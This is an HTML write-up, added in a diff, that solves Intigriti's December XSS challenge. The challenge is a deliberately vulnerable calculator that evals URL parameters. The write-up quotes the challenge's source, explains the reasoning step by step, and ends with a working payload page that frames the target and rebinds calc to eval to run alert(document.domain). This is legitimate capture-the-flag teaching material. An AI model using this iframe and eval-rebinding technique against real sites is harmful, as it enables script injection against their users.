@@ -1,0 +1,192 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimal-ui">
+    <title>Intigriti&#x27;s December XSS Challenge</title>
+    <link type="text/css" rel="stylesheet" href="assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="assets/css/hljs-github.min.css"/>
+  </head>
+  <body>
+    <article class="markdown-body"><h1 id="intigriti's-december-xss-challenge"><a class="header-link" href="#intigriti's-december-xss-challenge"></a>Intigriti&#39;s December XSS Challenge</h1>
+<h2 id="tl;dr"><a class="header-link" href="#tl;dr"></a>TL;DR</h2>
+<p>One solutuion is to creta the following HTML page:</p>
+<pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+        setTimeout(<span class="hljs-function"><span class="hljs-params">()</span>=&gt;</span>{a.src+=<span class="hljs-string">"&amp;num1=calc&amp;num2=eval"</span>}, <span class="hljs-number">1000</span>);
+        setTimeout(<span class="hljs-function"><span class="hljs-params">()</span>=&gt;</span>{ a.src+=<span class="hljs-string">"&amp;num1=alert(document.domain)"</span>}, <span class="hljs-number">2000</span>);
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"a"</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">"https://challenge-1220.intigriti.io/?num1=onhashchange&amp;operator=%3D&amp;num2=init&amp;#"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><h2 id="details"><a class="header-link" href="#details"></a>Details</h2>
+<p> On December 7th, Intigriti released a new <a href="https://challenge-1220.intigriti.io/">XSS challenge</a>. I love their challenge and as soon as I saw it, I wanted to give it a try in order to solve it.</p>
+<p> So, what does this challenge look like ?
+ <img src="./1.png" alt="Challenge screenshot"></p>
+<p>As you can see, this is a simple calculator app. Let&#39;s start clicking on some buttons to see what happens.
+We can see that when we use the app, the URL is modified, especially the <strong>num1</strong>, <strong>operator</strong> and <strong>num2</strong> parameters. Is that where we will have to inject our payload ?
+<img src="./2.png" alt="URL Parameters"></p>
+<p>We cannot do anything if we don&#39;t take a look at the source of the page. We see that Javascript is in a file called <strong>script.js</strong>.</p>
+<p class="img-container"><img src="./3.png" alt="source code"></p>
+<p>This file contains the following code :</p>
+<pre class="hljs"><code> <span class="hljs-built_in">window</span>.name = <span class="hljs-string">"Intigriti's XSS challenge"</span>;
+
+<span class="hljs-keyword">const</span> operators = [<span class="hljs-string">"+"</span>, <span class="hljs-string">"-"</span>, <span class="hljs-string">"/"</span>, <span class="hljs-string">"*"</span>, <span class="hljs-string">"="</span>];
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">calc</span>(<span class="hljs-params">num1 = "", num2 = "", operator = ""</span>)</span>{
+  operator = <span class="hljs-built_in">decodeURIComponent</span>(operator);
+  <span class="hljs-built_in">var</span> operation = <span class="hljs-string">`<span class="hljs-subst">${num1}</span><span class="hljs-subst">${operator}</span><span class="hljs-subst">${num2}</span>`</span>;
+  <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"operation"</span>).value = operation;
+  <span class="hljs-keyword">if</span>(operators.indexOf(operator) == <span class="hljs-number">-1</span>){
+    <span class="hljs-keyword">throw</span> <span class="hljs-string">"Invalid operator."</span>;
+  }
+  <span class="hljs-keyword">if</span>(!(<span class="hljs-regexp">/^[0-9a-zA-Z-]+$/</span>.test(num1)) || !(<span class="hljs-regexp">/^[0-9a-zA-Z]+$/</span>.test(num2))){
+    <span class="hljs-keyword">throw</span> <span class="hljs-string">"No special characters."</span>
+  }
+  <span class="hljs-keyword">if</span>(operation.length &gt; <span class="hljs-number">20</span>){
+    <span class="hljs-keyword">throw</span> <span class="hljs-string">"Operation too long."</span>;
+  }
+  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(operation);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>)</span>{
+  <span class="hljs-title">try</span>{
+    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"result"</span>).value = calc(getQueryVariable(<span class="hljs-string">"num1"</span>), getQueryVariable(<span class="hljs-string">"num2"</span>), getQueryVariable(<span class="hljs-string">"operator"</span>));
+  }
+  <span class="hljs-keyword">catch</span>(ex){
+    <span class="hljs-built_in">console</span>.log(ex);
+  }
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getQueryVariable</span>(<span class="hljs-params">variable</span>) </span>{
+    <span class="hljs-built_in">window</span>.searchQueryString = <span class="hljs-built_in">window</span>.location.href.substr(<span class="hljs-built_in">window</span>.location.href.indexOf(<span class="hljs-string">"?"</span>) + <span class="hljs-number">1</span>, <span class="hljs-built_in">window</span>.location.href.length);
+    <span class="hljs-built_in">var</span> vars = searchQueryString.split(<span class="hljs-string">'&amp;'</span>);
+    <span class="hljs-built_in">var</span> value;
+    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">var</span> i = <span class="hljs-number">0</span>; i &lt; vars.length; i++) {
+        <span class="hljs-built_in">var</span> pair = vars[i].split(<span class="hljs-string">'='</span>);
+        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">decodeURIComponent</span>(pair[<span class="hljs-number">0</span>]) == variable) {
+            value = <span class="hljs-built_in">decodeURIComponent</span>(pair[<span class="hljs-number">1</span>]);
+        }
+    }
+    <span class="hljs-keyword">return</span> value;
+}
+
+<span class="hljs-comment">/*
+ The code below is calculator UI and not part of the challenge
+*/</span>
+
+<span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
+ init();
+ <span class="hljs-built_in">var</span> numberBtns = <span class="hljs-built_in">document</span>.body.getElementsByClassName(<span class="hljs-string">"number"</span>);
+ <span class="hljs-keyword">for</span>(<span class="hljs-built_in">var</span> i = <span class="hljs-number">0</span>; i &lt; numberBtns.length; i++){
+   numberBtns[i].onclick = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)</span>{
+     setNumber(e.target.innerText)
+   };
+ };
+ <span class="hljs-built_in">var</span> operatorBtns = <span class="hljs-built_in">document</span>.body.getElementsByClassName(<span class="hljs-string">"operator"</span>);
+ <span class="hljs-keyword">for</span>(<span class="hljs-built_in">var</span> i = <span class="hljs-number">0</span>; i &lt; operatorBtns.length; i++){
+   operatorBtns[i].onclick = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)</span>{
+     setOperator(e.target.innerText)
+   };
+ };
+
+  <span class="hljs-built_in">var</span> clearBtn = <span class="hljs-built_in">document</span>.body.getElementsByClassName(<span class="hljs-string">"clear"</span>)[<span class="hljs-number">0</span>];
+  clearBtn.onclick = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
+    clear();
+  }
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setNumber</span>(<span class="hljs-params">number</span>)</span>{
+  <span class="hljs-built_in">var</span> <span class="hljs-built_in">url</span> = <span class="hljs-keyword">new</span> URL(<span class="hljs-built_in">window</span>.location);
+  <span class="hljs-built_in">var</span> num1 = getQueryVariable(<span class="hljs-string">'num1'</span>) || <span class="hljs-number">0</span>;
+  <span class="hljs-built_in">var</span> num2 = getQueryVariable(<span class="hljs-string">'num2'</span>) || <span class="hljs-number">0</span>;
+  <span class="hljs-built_in">var</span> operator = getQueryVariable(<span class="hljs-string">'operator'</span>);
+  <span class="hljs-keyword">if</span>(operator == <span class="hljs-literal">undefined</span> || operator == <span class="hljs-string">""</span>){
+    <span class="hljs-built_in">url</span>.searchParams.set(<span class="hljs-string">'num1'</span>, <span class="hljs-built_in">parseInt</span>(num1 + number));
+  }
+  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(operator != <span class="hljs-literal">undefined</span>){
+    <span class="hljs-built_in">url</span>.searchParams.set(<span class="hljs-string">'num2'</span>, <span class="hljs-built_in">parseInt</span>(num2 + number));
+  }
+  <span class="hljs-built_in">window</span>.history.pushState({}, <span class="hljs-string">''</span>, <span class="hljs-built_in">url</span>);
+  init();
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setOperator</span>(<span class="hljs-params">operator</span>)</span>{
+  <span class="hljs-built_in">var</span> <span class="hljs-built_in">url</span> = <span class="hljs-keyword">new</span> URL(<span class="hljs-built_in">window</span>.location);
+  <span class="hljs-keyword">if</span>(getQueryVariable(<span class="hljs-string">'num2'</span>) != <span class="hljs-literal">undefined</span>){ <span class="hljs-comment">//operation with previous result</span>
+    <span class="hljs-built_in">url</span>.searchParams.set(<span class="hljs-string">'num1'</span>, calc(getQueryVariable(<span class="hljs-string">"num1"</span>), getQueryVariable(<span class="hljs-string">"num2"</span>), getQueryVariable(<span class="hljs-string">"operator"</span>)));
+    <span class="hljs-built_in">url</span>.searchParams.delete(<span class="hljs-string">'num2'</span>);
+    <span class="hljs-built_in">url</span>.searchParams.set(<span class="hljs-string">'operator'</span>, operator);
+  }
+  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(getQueryVariable(<span class="hljs-string">'num1'</span>) != <span class="hljs-literal">undefined</span>){
+    <span class="hljs-built_in">url</span>.searchParams.set(<span class="hljs-string">'operator'</span>, operator);
+  }
+  <span class="hljs-title">else</span>{
+    alert(<span class="hljs-string">"You need to pick a number first."</span>);
+  }
+  <span class="hljs-built_in">window</span>.history.pushState({}, <span class="hljs-string">''</span>, <span class="hljs-built_in">url</span>);
+  init();
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clear</span>(<span class="hljs-params"></span>)</span>{
+    <span class="hljs-built_in">var</span> <span class="hljs-built_in">url</span> = <span class="hljs-keyword">new</span> URL(<span class="hljs-built_in">window</span>.location);
+    <span class="hljs-built_in">url</span>.searchParams.delete(<span class="hljs-string">'num1'</span>);
+    <span class="hljs-built_in">url</span>.searchParams.delete(<span class="hljs-string">'num2'</span>);
+    <span class="hljs-built_in">url</span>.searchParams.delete(<span class="hljs-string">'operator'</span>);
+    <span class="hljs-built_in">window</span>.history.pushState({}, <span class="hljs-string">''</span>, <span class="hljs-built_in">url</span>);
+    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"result"</span>).value = <span class="hljs-string">""</span>;
+    init();
+}</code></pre><p><em>script.js content</em></p>
+<p>The above lines tell us that the 
+<code>init()</code> function is called first. </p>
+<pre class="hljs"><code><span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
+init();
+...</code></pre><p>So, what this function do ?</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>)</span>{
+  <span class="hljs-keyword">try</span>{
+    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"result"</span>).value = calc(getQueryVariable(<span class="hljs-string">"num1"</span>), getQueryVariable(<span class="hljs-string">"num2"</span>), getQueryVariable(<span class="hljs-string">"operator"</span>));
+  }
+  <span class="hljs-keyword">catch</span>(ex){
+    <span class="hljs-built_in">console</span>.log(ex);
+  }
+}</code></pre><p>We see that is role is to set a value to the <code>result</code> textbox with the value returned by the <code>calc()</code> function. Calc takes 3 parameters: the 2 numbers to be calculated and the operator. Those are passed via URL parameters and <code>init()</code> gets them with the help of another function: <code>getQueryVariable()</code> that will look for the value of the parameter we tell it to return us.</p>
+<p>Now, take a look at the <code>calc()</code> function.</p>
+<pre class="hljs"><code><span class="hljs-keyword">const</span> operators = [<span class="hljs-string">"+"</span>, <span class="hljs-string">"-"</span>, <span class="hljs-string">"/"</span>, <span class="hljs-string">"*"</span>, <span class="hljs-string">"="</span>];
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">calc</span>(<span class="hljs-params">num1 = <span class="hljs-string">""</span>, num2 = <span class="hljs-string">""</span>, operator = <span class="hljs-string">""</span></span>)</span>{
+  operator = <span class="hljs-built_in">decodeURIComponent</span>(operator);
+  <span class="hljs-keyword">var</span> operation = <span class="hljs-string">`<span class="hljs-subst">${num1}</span><span class="hljs-subst">${operator}</span><span class="hljs-subst">${num2}</span>`</span>;
+  <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"operation"</span>).value = operation;
+  <span class="hljs-keyword">if</span>(operators.indexOf(operator) == <span class="hljs-number">-1</span>){
+    <span class="hljs-keyword">throw</span> <span class="hljs-string">"Invalid operator."</span>;
+  }
+  <span class="hljs-keyword">if</span>(!(<span class="hljs-regexp">/^[0-9a-zA-Z-]+$/</span>.test(num1)) || !(<span class="hljs-regexp">/^[0-9a-zA-Z]+$/</span>.test(num2))){
+    <span class="hljs-keyword">throw</span> <span class="hljs-string">"No special characters."</span>
+  }
+  <span class="hljs-keyword">if</span>(operation.length &gt; <span class="hljs-number">20</span>){
+    <span class="hljs-keyword">throw</span> <span class="hljs-string">"Operation too long."</span>;
+  }
+  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(operation);</code></pre><p>This function will concatenate our 3 parameters <code>num1</code>, <code>num2</code> and <code>operator</code> in one string, then will perform some validity checks on each one (with the help of some RegExp and an array). So, num1 can be constitued of any number, any letter and the <strong>minus</strong> sign. The same rule applies to num2 excep for the <strong>minus</strong> sign. Operator can only takes one of the values in the <code>operators</code> array. Finally, it will eval this concatenated string (the total length cannot be &gt; 20 chars). Here is the real danger.</p>
+<p>First, try to pop an alert by assigning <code>alert</code> on the <code>onclick</code> event. The URL is <a href="https://challenge-1220.intigriti.io/?num1=onclick&amp;operator=%3D&amp;num2=alert">https://challenge-1220.intigriti.io/?num1=onclick&amp;operator=%3D&amp;num2=alert</a>. This URL passes the tests. The <code>calc</code> function will execute <code>eval(&quot;onclick=alert&quot;)</code>. So, by clicking somewhere on the page, an alert will pop.
+<img src="./4.png" alt="onclick">
+Good, it works !</p>
+<p>An idea would be to set num1 to <strong>location</strong>, operator to <strong>=</strong> and num2 to <strong>javascript:alert(document.domain)</strong>. But this is not possible because the length would be over 19 and <code>num2</code> contains forbidden chars! Can we find a way to bypass this ?</p>
+<p>Due to the lack of security headers, we can display the challenge page in a frame. My first idea was to create an iframe with a name attribute value like <strong>&quot;javascript:alert(document.domain)&quot;</strong> and a src=<strong><a href="https://challenge-1220.intigriti.io/?num1=location&amp;operator=%3D&amp;num2=name">https://challenge-1220.intigriti.io/?num1=location&amp;operator=%3D&amp;num2=name</a></strong>. Indeed, we can control the framed page name. But I got redirected to <strong><a href="https://challenge-1220.intigriti.io/Intigriti&#39;s%20XSS%20challenge">https://challenge-1220.intigriti.io/Intigriti&#39;s%20XSS%20challenge</a></strong>. Indeed, the first line of the <strong>script.js</strong> file sets the name to <strong>&quot;Intigriti&#39;s XSS challenge&quot;</strong> so we cannot use this trick.</p>
+<p>Can we execute the <code>eval</code> part many times, without reloading the page ? Yes we can thanks to the <strong>onhashchange</strong> event. Indeed when we add or modify the hash value in an URL, page is not reloaded.
+Let&#39;s change our URL and add a # :</p>
+<p><strong><a href="https://challenge-1220.intigriti.io/?num1=onhashchange&amp;operator=%3D&amp;num2=alert#test">https://challenge-1220.intigriti.io/?num1=onhashchange&amp;operator=%3D&amp;num2=alert#test</a></strong>
+Unfortunately, Chrome console will display an error with this url
+<img src="./5.png" alt="error"></p>
+<p>Yes, the # is seen as belonging to <strong>num2</strong> because of the <code>getQueryVariable</code> function. No problem, just add <strong>&amp;</strong> before the <strong>#</strong> and this is solved. This URL becomes <strong><a href="https://challenge-1220.intigriti.io/?num1=onhashchange&amp;operator=%3D&amp;num2=alert&amp;#test">https://challenge-1220.intigriti.io/?num1=onhashchange&amp;operator=%3D&amp;num2=alert&amp;#test</a></strong>. If we change the hash value, an alert is oped each time.
+That&#39;s a good thing, because we can control this value with some script.</p>
+<p>At this step, we know how to fire an event many times on the page, we know that we can assign things to others. Let&#39;s put it together.</p>
+<p>We need to first assign <code>init()</code> to <code>onhashchange</code> to fire it when we change the # value.
+Then, we point the  <code>calc</code> to  <code>eval</code>. So, <code>init</code> will now call <code>eval</code> instead of the &quot;real&quot; <code>calc</code> code. And as we know that it takes <strong>num1</strong>, <strong>num2</strong> and <strong>operator</strong> parameters, if we set <strong>num1</strong> to <code>alert(document.domain)</code>, we actually execute <code>eval(&quot;alert(document.domain)&quot;)</code> insteadof <code>calc(num1, num2, operator)</code></p>
+<p>Final payload is:</p>
+<pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+        setTimeout(<span class="hljs-function"><span class="hljs-params">()</span>=&gt;</span>{a.src+=<span class="hljs-string">"&amp;num1=calc&amp;num2=eval"</span>}, <span class="hljs-number">1000</span>); <span class="hljs-comment">//1 sec after page is loaded</span>
+        setTimeout(<span class="hljs-function"><span class="hljs-params">()</span>=&gt;</span>{ a.src+=<span class="hljs-string">"&amp;num1=alert(document.domain)"</span>}, <span class="hljs-number">2000</span>);<span class="hljs-comment">//2 sec after page is loaded</span>
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"a"</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">"https://challenge-1220.intigriti.io/?num1=onhashchange&amp;operator=%3D&amp;num2=init&amp;#"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p class="img-container"><img src="./6.png" alt="success"></p>
+    </article>
+  </body>
+</html>
